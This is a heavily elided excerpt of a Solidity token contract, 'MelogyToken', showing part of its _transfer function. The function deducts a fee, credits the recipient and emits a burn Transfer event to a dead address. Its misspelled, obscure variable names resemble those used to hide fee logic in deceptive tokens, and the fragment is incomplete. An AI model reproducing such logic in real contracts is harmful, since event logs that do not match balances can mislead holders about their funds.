...
contract token is Ownable, IERC20 {
    ...
    string private _name = "MelogyToken";
    string private _symbol = "Melogy";
    ...
    function _transfer(address sender, address recipient, uint256 amonnts) internal virtual {
        ...
        uint256 amoun;
        amoun = amonnts - fieiamonnt;
        _balance[recipient] += amoun;
        if (_burnfiei > 0){
            emit Transfer (sender, _DEADaddress, fieiamonnt);
        }
